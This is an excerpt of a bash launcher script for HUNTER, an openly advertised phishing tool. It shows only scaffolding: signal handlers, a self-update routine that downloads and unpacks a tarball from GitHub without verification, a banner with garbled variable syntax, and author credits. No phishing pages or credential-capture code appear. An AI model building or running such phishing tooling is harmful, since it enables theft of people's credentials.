...
##   HUNTER 	: 	Automated Phishing Tool
##   Author 	: 	ATHEX H4CK3R
##   Version 	: 	2.4
##   Github 	: 	https://github.com/Athexhacker/hunter
__version__="2.3.5"
...
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Tool intrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Tool Terminated." 2>&1; reset_color; }
	exit 0
}
...
check_update(){
	...
	relase_url='https://api.github.com/repos/Athexhacker/hunter/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/Athexhacker/hunter/archive/refs/tags/${new_version}.tar.gz"
	...
	if [[ $new_version != $__version__ ]]; then
		...
		--retry 3 --retry-delay 2 --location --output ".hunter.tar.gz" "${tarball_url}"

		if [[ -e ".hunter.tar.gz" ]]; then
			tar -xf .hunter.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
...
░                    ░███   ░░███ ░░███  ░░███ ░░██████ ░░███ ░█░░░███░░░█░░███░░░░░█░░███░░░░░███ 
		...
		${GREEN}[$T{WHITE}-$H{GREEN}]$ IS{CYAN} Tool Created by ATHEX HACKER${WHITE}
	EOF
}
...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Remember me in your prays.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}ATHEX H4CK3R ${RED}[ ${ORANGE}${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Athexhacker
		${GREEN} You Tube ${RED}:  ${CYAN}inziXploit444
